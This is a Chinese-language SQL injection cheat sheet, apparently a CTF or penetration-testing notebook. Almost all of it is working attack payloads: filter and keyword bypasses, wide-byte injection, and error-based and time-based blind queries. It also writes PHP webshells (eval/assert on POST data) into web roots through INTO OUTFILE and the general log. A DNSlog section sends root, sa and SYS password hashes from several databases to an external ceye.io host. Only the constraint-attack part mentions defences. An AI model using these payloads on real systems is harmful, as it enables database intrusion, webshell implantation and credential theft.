# MYSQL injection



## 推荐网站

 http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/

[http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/](http://p0desta.com/2018/03/29/SQL注入备忘录/)

[https://ultramangaia.github.io/blog/2018/SQL%E6%B3%A8%E5%85%A5.html](https://ultramangaia.github.io/blog/2018/SQL注入.html)

 https://security.yirendai.com/news/share/15 

 https://xz.aliyun.com/t/7169# 



## 约束攻击

我们先通过下列语句建立一个用户表

```
CREATE TABLE users(
    username varchar(20),
    password varchar(20)
)
```

注册代码：

```
<?php
$conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
$username = addslashes(@$_POST['username']);
$password = addslashes(@$_POST['password']);
$sql = "select * from users where username = '$username'";
$rs = mysqli_query($conn,$sql);
if($rs->fetch_row()){
    die('账号已注册');
}else{
    $sql2 = "insert into users values('$username','$password')";
    mysqli_query($conn,$sql2);
    die('注册成功');
}
?>
```

登录判断代码：

```
<?php
$conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
$username = addslashes(@$_POST['username']);
$password = addslashes(@$_POST['password']);
$sql = "select * from users where username = '$username' and password='$password';";
$rs = mysqli_query($conn,$sql);
if($rs->fetch_row()){
    $_SESSION['username']=$password;
}else{
    echo "fail";
}
?>
```

在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？

我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。

而对于`SELECT`查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。

通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个`username=admin[25个空格]x&password=123456`的账号，服务器会先查询`admin[25个空格]x`的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为`username=admin[20个空格]&password=123456`。

接着进行登录的时，我们使用：`username=admin&password=123456`进行登录，即可成功登录admin的账号。

防御：

- 给username字段添加unique属性。
- 使用id字段作为判断用户的凭证。
- 插入数据前判断数据长度。

## 心得

1. 根据情景猜测可能的sql注入
2. 细心观察确定sql注入点(现象:哪里突然没有显示(执行错误),不是预期值.....)
3. 猜测sql语句的样子(是select,update,insert还是其他什么,字符串使用`'还是"`包围的...)
4. 判断黑名单和过滤内容



## 一些小知识



### 向一张表中插入该表的数据的方法

```
insert ... select...
insert into users (email,username,password) values((SELECT group_concat(a) FROM (select 'email:'`a` union SELECT group_concat(email) from users)`b`),1,1)
```





### pdo

PDO可以堆叠注入



|                    | Mysqli | PDO    | MySQL   |
| ------------------ | ------ | ------ | ------- |
| 引入的PHP版本      | 5.0    | 5.0    | 3.0之前 |
| PHP5.x是否包含     | 是     | 是     | 是      |
| 多语句执行支持情况 | 是     | 大多数 | 否      |

> 引自：[PDO场景下的SQL注入探究](https://xz.aliyun.com/t/3950)

### select语句的格式

```
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
      [PARTITION partition_list]
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]
```







## 语法参考与小技巧

### desc查询表结构语法

 DESC tbl_name [col_name | wild]

### 行间注释

- `--`

  

  ```mysql
  DROP sampletable;--
  ```

- `#`

  

  ```
  DROP sampletable;#
  ```

### 行内注释

- `/*注释内容*/`

  

  ```
  DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`   SELECT/*替换空格*/password/**/FROM/**/Members
  ```

- `/*! MYSQL专属 */`

  

  ```
  SELECT /*!32302 1/0, */ 1 FROM tablename
  ```

## 注入常见参数

### user()：当前数据库用户

### database()：当前数据库名

### version()：当前使用的数据库版本

### @@hostname

### @@port

### @@version

### @@datadir：数据库存储数据路径

### concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password)

### group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来

### concat_ws()：用法类似

### hex() 和 unhex()：用于 hex 编码解码

### load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\

### select xxoo into outfile '路径'：权限较高时可直接写文件



## 绕过



### MYSQL编码绕过



```
MYSQL 中 utf8_unicode_ci和utf8_general_ci两种编码格式,utf8_general_ci不区分大小写,Ä = A, Ö = O, Ü = U这三种条件都成立,对于utf8_general_ci下面的等式成立：ß=s,但是，对于utf8_unicode_ci下面等式才成立：ß = ss
```





### 禁用 information

```
Mysql5.6及以上版本中 `innodb_index_stats ` 和`innodb_table_stats `这两个表中都包含所有新创建的数据库和表名
sys.schema_table_statistics ...
```





### 利用php preg_match的回溯次数绕过正则

> PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限`pcre.backtrack_limit`。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为 100万)，那么正则停止，返回未匹配到数据。



### 数字被拦截

```
false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K
true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L
true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M
floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N
ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O
floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P
ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q
ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R
floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S
floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T
```





### 过滤表名的情况下查询

```mysql
select a from b='' or substr((hex((select group_concat(a) from (select 1,2,3`a`,4,5 union select * from users)`b`))),71,1)=0#
```



### 关键字 %00绕过

•SELECT :SE\x00LECT  (\x00指ASCII为0的字符） 

### 绕过逗号限制

1.join

`select 'a','b','c','d' union select * from ((select 1)a join (select 2)b join (select 3)c join (select 4)d);`

2.扩号:mid('a'from(1))



### 绕过空格限制

1. /**/代替空格
2. 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格
3. 使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a
4. ^,&&,||,括号综合利用
5. `and/or`后面可以跟上`奇数个!、偶数个~`可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略

### 绕过引号限制

- -- hex 编码                                               
SELECT * FROM Users WHERE username = 0x61646D696E
- -- char() 函数                                           SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)

### 绕过字符串黑名单

- SELECT 'a' 'd' 'mi' 'n';
- SELECT CONCAT('a', 'd', 'm', 'i', 'n');
- SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
- SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
- SELECT extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)
- SELECT (char(97)+char(100)+char(109)+char(105)+char(110))
- `SELECT X'5061756c'; => paul`

### 禁用select,where等等关键字用prepare执行预定义语句



关于MySQL中的预处理语句原理与使用，这篇文章讲解的比较详细：MySQL的SQL预处理(Prepared)。本题中由于可以使用堆叠查询，并且需要使用SELECT关键字并绕过过滤，因此想到利用字符串转换与拼接构造语句最后执行，这时就可以使用预处理语句。

预处理语句使用方式：

```mysql
PREPARE sqla from '[my sql sequece]';   //预定义SQL语句
EXECUTE sqla;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句

```



预定义语句也可以通过变量进行传递，比如：

```sql
SET @tn = 'hahaha';  //存储表名
SET @sql = concat('select * from ', @tn);  //存储SQL语句
PREPARE sqla from @sql;   //预定义SQL语句
EXECUTE sqla;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
```





### 宽字节注入

#### gbk



- 作用

	- 这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。

- 原理

	- 反斜杠 \ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。

#### latin1 与 utf-8



```
<?php
//该代码节选自：离别歌's blog
$mysqli = new mysqli("localhost", "root", "root", "cat");


$mysqli->query("set names utf8");

$username = addslashes($_GET['username']);

/* Select queries return a resultset */
$sql = "SELECT * FROM `table1` WHERE username='{$username}'";
$result = $mysqli->query( $sql )
$mysqli->close();
?>
```





`$mysqli->query("set names utf8");`这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。

上边在gbk宽字节注入的时候讲到过：`set names utf8;`相当于：

```
mysql>SET character_set_client ='utf8';
mysql>SET character_set_results ='utf8';
mysql>SET character_set_connection ='utf8';
```

>SQL语句会先转成`character_set_client`设置的编码。但，他接下来还会继续转换。`character_set_client`客户端层转换完毕之后，数据将会交给`character_set_connection`连接层处理，最后在从`character_set_connection`转到数据表的内部操作字符集。 

我们输入：`?username=admin%c2`，`%c2`是一个Latin1字符集不存在的字符。

由上述，可以简单的知道：%00-%7F可以直接表示某个字符、%C2-%F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。

但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：`00-7F、C2-EF`。

而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。

利用这一特性，我们的payload为`?username=admin%c2`，此处的`%c2`换为`%c2-%ef`均可。

```
SELECT * FROM `table1` WHERE username='admin'
```

因为`admin%c2`在最后一层的内部操作字符集转换中变成`admin`。



### 函数代替

- mid与substr
- limit x,x与group_cat()
- substr(,,)与substr( from x for x) 与 order by
- concat

	- make_set(3,'~',version())
	- lpad((version()),20,'@')
	- repeat((version()),2)
	- 来源:http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/

- if 与 case when

```sql
SELECT case when 1=2 then 1 ELSE 2 END;
```



### 杂

-  or <->||
-  and <->&&
-  不要忘记 ^
-  直接拼接`=`号，如：`?id=1=(condition)`来代替and / or 
- =<>    <=>    in/between/like

  - SELECT 1 WHERE 1 = 1 ó SELECT 1 WHERE 1 IN (1)
- SELECT 1 WHERE 1 = 1 ó SELECT 1 WHERE 1 LIKE "1"
  - SELECT 1 WHERE 1 < 10 ó SELECT 1 WHERE 1 BETWEEN (0, 10)
-   union select 被过滤 => 用union all select 来绕过





### 在不知道段名的情况下查找

```
select * from flags where id='abcdd' union select 1,(select group_concat(b,e,f,g) from ( select 1 as e,2 as f,3 as g,4 as b union select*from flags) x ),3,4;
```



```
(select 'admin','admin')>(select * from users limit 1)
```





## 注入语句备忘

### limit 处注入

条件：mysql 版本 > 5.0.0  ，<5.6.6



### 表是否存在

```
select count(*) from xxx;
```





### 查询表结构(爆字段名)



`show create table table_name;`



### handler代替select查询

```
handler FlagHere open;handler FlagHere read first;

handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名
handler yunensec read first; #读取指定表/句柄的首行数据
handler yunensec read next; #读取指定表/句柄的下一行数据
handler yunensec read next; #读取指定表/句柄的下一行数据
...
handler yunensec close; #关闭句柄
```



handler 的语法

```
HANDLER tbl_name OPEN [ [AS] alias]

HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]

HANDLER tbl_name CLOSE
```



### 数据库名

```
SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;
SELECT database();
SELECT schema_name FROM information_schema.schemata; 
```



### 表名

```
SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;
SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;
select 1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* 列出当前数据库中的表 */
AND (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)))>100
```



### 列名

```
SELECT column_name FROM sys.schema_auto_increment_columns WHERE table_name='mspwd' GROUP BY column_name;
```



- union 查询

	- UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'

- 盲注

	- and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users' ),1,1)))>100

- 报错

	- 利用 PROCEDURE ANALYSE()

		- -- 这个需要 web 展示页面有你所注入查询的一个字段
		- -- 获得第一个段名
		- SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE()
		- -- 获得第二个段名
		- 1 LIMIT 1,1 PROCEDURE ANALYSE()
		- -- 获得第三个段名
		- 1 LIMIT 2,1 PROCEDURE ANALYSE()

### 根据列名查询所在的表

- -- 查询字段名为 username 的表

	- SELECT table_name FROM information_schema.columns WHERE column_name = 'username';

- -- 查询字段名中包含 username 的表

	- SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';

### 报错注入

- floor()

	- `select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);`

- extractvalue()

	- select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

- updatexml()

	- select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

- geometrycollection()

	- select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

- multipoint()

	- select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

- polygon()

	- select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

- multipolygon()

	- select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

- linestring()

	- select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

- multilinestring()

	- select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

- exp()

	- select * from test where id=1 and exp(~(select * from(select user())a));

- 通过join报错爆字段

	- select * from (select * from 表名 a join 表名 b) c)  
在得到一个字段后，使用using得到下一个字段
select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c  

### 基于时间的盲注

The following SQL codes will delay the output from MySQL.

```
+BENCHMARK(40000000,SHA1(1337))+
'%2Bbenchmark(3200,SHA1(1))%2B'
AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
```

#### Using SLEEP in a subselect

```
1 and (select sleep(10) from dual where database() like '%')#
1 and (select sleep(10) from dual where database() like '___')# 
1 and (select sleep(10) from dual where database() like '____')#
1 and (select sleep(10) from dual where database() like '_____')#
1 and (select sleep(10) from dual where database() like 'a____')#
...
1 and (select sleep(10) from dual where database() like 's____')#
1 and (select sleep(10) from dual where database() like 'sa___')#
...
1 and (select sleep(10) from dual where database() like 'sw___')#
1 and (select sleep(10) from dual where database() like 'swa__')#
1 and (select sleep(10) from dual where database() like 'swb__')#
1 and (select sleep(10) from dual where database() like 'swi__')#
...
1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
```

#### Using conditional statements

```
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

### **MySQL**读写文件

- 一切都仅限于MySQL 5.6以前，高版本默认配置secure_file_priv为NULL，无法读写任何文件。

- LOAD_FILE 任意读文件

  - SELECT load_file('/etc/passwd');

- 在Windows下可利用UNC路径实现数据外带

  - LOAD DATA LOCAL INFILE读文件

  - LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE a fields terminated by ''

- 写文件

  - `SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/1.php';`

### 利用日志读写文件

```shell
mysql> show variables like '%general%'#先看下当前mysql默认的日志位置在什么地方,'C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log' 顺手把原来正常的日志路径稍微记录下,等会儿干完活儿再把它恢复回来
mysql> set global general_log = on#默认基本都是关闭的,不然这个增删改查的记录量可能会非常大
mysql> set global general_log_file = 'C:/Program Files (x86)/Apache Software Foundation/Apache2.2/htdocs/abouts.php'#此时,再把原本的日志文件位置指向到目标网站的物理路径
mysql> select '<?php eval($_POST[request]);?>'#开始写shell,这里就是个普通的shell,不免杀,如果有waf的话,可以用下面的免杀shell


##写完之后记得恢复
mysql> set global general_log_file = 'C:\phpStudy\MySQL\data\stu1.log';
mysql> set global general_log = off;
```



### 可以分支的语句

```
ELT(N ,str1 ,str2 ,str3 ,…)
函数使用说明：若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL 。 ELT() 是 FIELD() 的补数


```

```
FIELD(str, str1, str2, str3, ……)

mysql> select * from bsqli where id = 1 and field(1>1,sleep(1));
+----+--------+----------+
| id | name   | password |
+----+--------+----------+
|  1 | K0rz3n | 123456   |
+----+--------+----------+
1 row in set (2.00 sec)

mysql> select * from bsqli where id = 1 and field(1=1,sleep(1));
Empty set (1.00 sec)
```

```
if
```

```
case when condition then 1 else 0 end
```



### 读/写文件

#### 读

Mysql读取文件通常使用load_file函数，语法如下：

```
select load_file(file_path);
```

第二种读文件的方法：

```
load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取服务端文件
```

第三种：

```
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取客户端文件
```

限制：

- 前两种需要`secure-file-priv`无值或为有利目录。
- 都需要知道要读取的文件所在的绝对路径。
- 要读取的文件大小必须小于`max_allowed_packet`所设置的值



#### 低权限读取文件

5.5.53`secure-file-priv=NULL`读文件payload，mysql8测试失败，其他版本自测。

```
drop table mysql.m1;
CREATE TABLE mysql.m1 (code TEXT );
LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';
select * from mysql.m1;
```



#### 服务端读取客户端文件



这个漏洞是mysql的一个特性产生的

简单描述该漏洞：Mysql客户端在执行`load data local`语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。

利用脚本:`https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py`

#### 写

```
select 1,"<?php @assert($_POST['t']);?>" into outfile '/var/www/html/1.php';
select 2,"<?php @assert($_POST['t']);?>" into dumpfile '/var/www/html/1.php';
```

限制：

- `secure-file-priv`无值或为可利用的目录
- 需知道目标目录的绝对目录地址
- 目标目录可写，mysql的权限足够。

#### 通过日志写文件

```
mysql> set global general_log_file = '/var/www/html/1.php';
mysql> set global general_log = on;
//慢查询日志
mysql> set global slow_query_log_file='/var/www/html/2.php'
mysql> set global slow_query_log=1;
```





## 注入类型

### 堆叠注入

select 1,2;select 2,3

### union 注入

#### 条件

- Union必须由两条或者两条以上的SELECT语句组成，语句之间使用Union链接。

- **Union中的每个查询必须包含相同数量的列。**

- 列的数据类型必须兼容：

  -兼容指数据库可以隐式转换类型A到类型B，例如：

  - int -> double

  - int -> varchar

### 盲注

#### bool 盲注





#### 时间盲注

##### **MySQL** **时间盲注**


- BENCHMARK

- 笛卡尔积

  - If (ascii(substr((select database()),%d,1))<%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)#

  - 无法理解则请自己复习《线性代数》与《数据库系统原理》

- 正则延迟

  - select if(substr((select 1)='1',1,1),concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',1);

ReDOS，无法理解则请自己复习编译原理

#### 报错盲注

select * from (SELECT "E10ADC3949BA59ABBE56E057F20F883E" as password) a where IF(LEFT(password, 1) = "E", EXP(100000000000), 1);

匹配上时产生报错，没匹配上时页面正常。

这里可以用所有会产生错误的函数，而不仅仅局限于那几个会产生报错注入的函数。

### insert into

#### 利用insert 来获取数据

##### 方法一

`sql=insert into test (col1,col2,...) values (val1,val2,...)`

在只能更改val1和回显val1的情况下

val1=`a'+conv(hex((selselectect '123')),16,10)+'.jpg`或`0+conv(hex((select xxx)))`

这边转为十进制的原因是:mysql将字符串转为数字时将其视为10进制数据

##### 方法二

猜测结构,注入两列

`sql=insert into xxx (xx,xx,xx) values ('xx',uuid,uuid)`

payload=`hello',1660,1660),(2,1660,1660)#.jpg`

#### 利用insert来修改数据

 `insert on duplicate key update` ，它能够让我们在新插入的一个数据和原有数据发生重复时，修改原有数据。那么我们通过这个技巧修改管理员的密码即可。 

### 利用php语言特性

#### php中利用格式化字符串漏洞绕过addslashes注入

[https://code.felinae98.cn/ctf/web/php%E4%B8%AD%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87addslashes%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5/](https://code.felinae98.cn/ctf/web/php中利用格式化字符串漏洞绕过addslashes进行注入/)

```php
$username = addslashes($_POST['username']);
$password = addslashes($_POST['password']);
$format = "SELECT * FROM user WHERE username='$username' and password=''%s';";
$sql = sprintf($format, $password);
```

可以使用这样的payload:`%1$'`不会引起相关报错

## mysql设置

### 语句日志

General_log

```mysql
show variables like 'general_log';  -- 查看日志是否开启
set global general_log=on; -- 开启日志功能
show variables like 'general_log_file';  -- 看看日志文件保存位置
set global general_log_file='tmp/general.lg'; -- 设置日志文件保存位置
show variables like 'log_output';  -- 看看日志输出类型  table或file
set global log_output='table'; -- 设置输出类型为 table
set global log_output='file';   -- 设置输出类型为file

```



## ORACLE SQL





## HSQL

HQL:hibernate query language 即hibernate提供的面向对象的查询语言

https://segmentfault.com/a/1190000013568216

## 渗透技巧:使用dnslog加快盲注速度

![](http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim)

### i. SQL Server

```sql
DECLARE @host varchar(1024);
SELECT @host=(SELECT TOP 1
master.dbo.fn_varbintohexstr(password_hash)
FROM sys.sql_logins WHERE name='sa')
+'.ip.port.b182oj.ceye.io';
EXEC('master..xp_dirtree
"\\'+@host+'\foobar$"');
```

### ii. Oracle

```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.b182oj.ceye.io');
SELECT UTL_HTTP.REQUEST('http://ip.port.b182oj.ceye.io/oracle') FROM DUAL;
SELECT HTTPURITYPE('http://ip.port.b182oj.ceye.io/oracle').GETCLOB() FROM DUAL;
SELECT DBMS_LDAP.INIT(('oracle.ip.port.b182oj.ceye.io',80) FROM DUAL;
SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.b182oj.ceye.io',80) FROM DUAL;
```

### iii. MySQL

```sql
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));
#这个必须在windows系统下因为unc是windows所特有的
#具有load_file权限
```

### iv. PostgreSQL

```sql
DROP TABLE IF EXISTS table_output;
CREATE TABLE table_output(content text);
CREATE OR REPLACE FUNCTION temp_function()
RETURNS VOID AS $
DECLARE exec_cmd TEXT;
DECLARE query_result TEXT;
BEGIN
SELECT INTO query_result (SELECT passwd
FROM pg_shadow WHERE usename='postgres');
exec_cmd := E'COPY table_output(content)
FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';
EXECUTE exec_cmd;
END;
$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT temp_function();
```



## xpath注入

 https://www.anquanke.com/post/id/155328 

 https://skysec.top/2018/07/30/ISITDTU-CTF-Web/#Access-Box 



## mariadb

### 过滤or的情况下查询表名

` select*/**/*group_concat(table_name)*/**/*from*/**/*mysql.innodb_table_stats `



## 判断是哪个dbms

```
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```



### mysql

` connection_id()、last_insert_id()、row_count() `

`last_insert_id`在select语句中为0



MicrosoftSql

`@@rowcount,@@pack_received`



## mssql

```
https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/
https://www.anquanke.com/post/id/86011
```





dnslog

```
DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) 
FROM test.dbo.test_user where [USER] = 'admin')%2b'.cece.nk40ci.ceye.io';
EXEC('master..xp_dirtree "\'%2b@host%2b'\foobar$"');
```

